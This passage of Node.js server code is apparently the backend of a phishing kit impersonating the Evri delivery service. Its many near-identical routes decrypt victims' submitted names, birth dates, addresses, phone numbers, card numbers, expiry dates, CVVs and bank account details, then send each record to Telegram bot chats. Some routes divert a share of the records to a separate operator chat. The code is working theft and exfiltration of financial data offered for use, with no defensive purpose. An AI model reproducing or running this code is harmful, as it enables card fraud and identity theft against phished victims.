        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri2", cors());

app.post("/fpaysEvri2", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri3", cors());

app.post("/fpaysEvri3", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-751200146&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri4", cors());

app.post("/fpaysEvri4", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-585918490&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri5", cors());

app.post("/fpaysEvri5", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-707342170&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/mannyman3", cors());

app.post("/mannyman3", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriMannyGC:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1001708890887&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

let symEvri = 3;

app.options("/symEvri", cors());

app.post("/symEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (symEvri == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriSYM:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 750220840,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri += 1;
      }

      res.send("Update Completed");
    });
});

let abzOutlaw = 3;

app.options("/abzEvri", cors());

app.post("/abzEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (abzOutlaw == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        abzOutlaw = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriAbz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1023110482,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        abzOutlaw += 1;
      }

      res.send("Update Completed");
    });
});

let capzEvri = 3;

app.options("/tcapzEvri", cors());

app.post("/tcapzEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriCapz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1437456088,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }

      res.send("Update Completed");
    });
});

let pokaEvri = 3;

app.options("/pokaEvri", cors());

app.post("/pokaEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pokaEvri == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pokaEvri = 0;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriPoka:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5280917183,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pokaEvri += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/skiiGCEvri", cors());

app.post("/skiiGCEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 4;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-633455690&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let yardzCount = 0;

app.options("/YardzUnitEvri", cors());

app.post("/YardzUnitEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
